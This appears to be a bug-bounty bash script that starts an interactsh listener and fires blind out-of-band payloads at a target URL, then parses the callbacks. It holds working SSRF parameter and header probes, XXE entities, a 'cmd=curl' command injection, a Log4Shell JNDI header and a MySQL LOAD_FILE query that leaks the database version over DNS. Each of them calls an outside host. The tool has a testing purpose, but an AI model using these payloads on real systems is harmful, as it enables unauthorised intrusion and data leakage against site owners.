#!/usr/bin/env bash
# hunt-oob-interact.sh — OOB (Out-of-Band) 漏洞偵測 via interactsh-client
#
# 用途：配合 nuclei/dalfox/手動測試的 blind 漏洞偵測
#   - 啟動 interactsh-client 背景監聽
#   - 對 target 注入 OOB payload (blind SSRF / XXE / RCE / SQLi)
#   - 監控 callback，命中即報
#
# Usage:
#   OUT_DIR=/path hunt-oob-interact.sh <url>
#   OOB_DURATION=120 hunt-oob-interact.sh <url>

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../configs/tool-profiles.sh" 2>/dev/null || true

TARGET="${1:-}"
[ -z "$TARGET" ] && { echo "usage: $0 <url>"; exit 1; }
OUT_DIR="${OUT_DIR:-/tmp/bb-oob-$$}"
mkdir -p "$OUT_DIR"

INTERACTSH="$(command -v interactsh-client 2>/dev/null || echo '')"
[ -z "$INTERACTSH" ] && { echo "✗ interactsh-client not found (go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest)"; exit 0; }

DOMAIN=$(echo "$TARGET" | sed -E 's|^https?://||' | cut -d/ -f1 | cut -d: -f1)
DURATION="${OOB_DURATION:-60}"
OOB_LOG="$OUT_DIR/oob_interactions.json"
OOB_URL_FILE="$OUT_DIR/oob_url.txt"

# ── Start interactsh-client in background ──────────────────
"$INTERACTSH" -json -o "$OOB_LOG" -poll-interval 5 -n 1 \
  ${INTERACTSH_SERVER:+-server "$INTERACTSH_SERVER"} \
  ${INTERACTSH_TOKEN:+-token "$INTERACTSH_TOKEN"} \
  > "$OOB_URL_FILE" 2>/dev/null &
INTERACT_PID=$!

sleep 3
OOB_URL=""
if [ -s "$OOB_URL_FILE" ]; then
  OOB_URL=$(grep -oE '[a-z0-9]+\.oast\.(pro|fun|me|live|site|online)' "$OOB_URL_FILE" | head -1)
fi

if [ -z "$OOB_URL" ]; then
  kill "$INTERACT_PID" 2>/dev/null || true
  echo "✗ Failed to get interactsh URL"
  exit 0
fi

echo "[oob] Listening on: $OOB_URL (${DURATION}s window)"

# ── Inject OOB payloads ────────────────────────────────────
UA="${CURL_UA:-Mozilla/5.0}"

# Blind SSRF payloads
SSRF_PARAMS=(url redirect callback webhook api_url endpoint proxy forward dest fetch load)
for p in "${SSRF_PARAMS[@]}"; do
  curl -sk -m 10 -A "$UA" \
    "${TARGET}?${p}=http://${OOB_URL}/ssrf-${p}" \
    -o /dev/null 2>/dev/null &
done

# Blind SSRF via headers
curl -sk -m 10 -A "$UA" \
  -H "X-Forwarded-For: http://${OOB_URL}/xff" \
  -H "Referer: http://${OOB_URL}/referer" \
  -H "X-Original-URL: http://${OOB_URL}/xorig" \
  "$TARGET" -o /dev/null 2>/dev/null &

# Blind XXE (if accepts XML)
XXE_PAYLOAD="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://${OOB_URL}/xxe\">]><foo>&xxe;</foo>"
curl -sk -m 10 -A "$UA" \
  -H "Content-Type: application/xml" \
  -d "$XXE_PAYLOAD" \
  "$TARGET" -o /dev/null 2>/dev/null &
curl -sk -m 10 -A "$UA" \
  -H "Content-Type: text/xml" \
  -d "$XXE_PAYLOAD" \
  "$TARGET" -o /dev/null 2>/dev/null &

# Blind RCE via common injection points
curl -sk -m 10 -A "$UA" \
  "${TARGET}?cmd=curl+${OOB_URL}/rce" \
  -o /dev/null 2>/dev/null &
curl -sk -m 10 -A "$UA" \
  -H "X-Api-Version: \${jndi:ldap://${OOB_URL}/log4j}" \
  "$TARGET" -o /dev/null 2>/dev/null &

# Blind SQLi (DNS exfiltration via LOAD_FILE on MySQL)
curl -sk -m 10 -A "$UA" \
  "${TARGET}?id=1'+AND+LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.${OOB_URL}\\\\a'))--+-" \
  -o /dev/null 2>/dev/null &

wait

# ── Monitor for callbacks ──────────────────────────────────
echo "[oob] Payloads sent. Waiting ${DURATION}s for callbacks..."
sleep "$DURATION"

# Stop listener
kill "$INTERACT_PID" 2>/dev/null || true
wait "$INTERACT_PID" 2>/dev/null || true

# ── Parse results ──────────────────────────────────────────
if [ ! -s "$OOB_LOG" ]; then
  echo "[oob] No callbacks received"
  exit 0
fi

python3 - "$OOB_LOG" <<'PYEOF' 2>/dev/null || true
import json, sys
seen = set()
for line in open(sys.argv[1]):
    line = line.strip()
    if not line:
        continue
    try:
        data = json.loads(line)
        proto = data.get("protocol", "unknown")
        full_id = data.get("full-id", "")
        remote = data.get("remote-address", "")
        raw = data.get("raw-request", "")[:200]
        key = f"{proto}:{full_id}"
        if key in seen:
            continue
        seen.add(key)
        path = ""
        if "/" in full_id:
            path = full_id.split("/", 1)[1] if "/" in full_id else ""
        vuln_type = path.split("-")[0] if "-" in path else path
        if vuln_type in ("ssrf", "xxe", "rce", "log4j", "sqli"):
            print(f"🔴 OOB [{proto.upper()}] {vuln_type} callback from {remote} — {full_id}")
        else:
            print(f"🔴 OOB [{proto.upper()}] callback from {remote} — {full_id}")
    except (json.JSONDecodeError, KeyError):
        pass
PYEOF
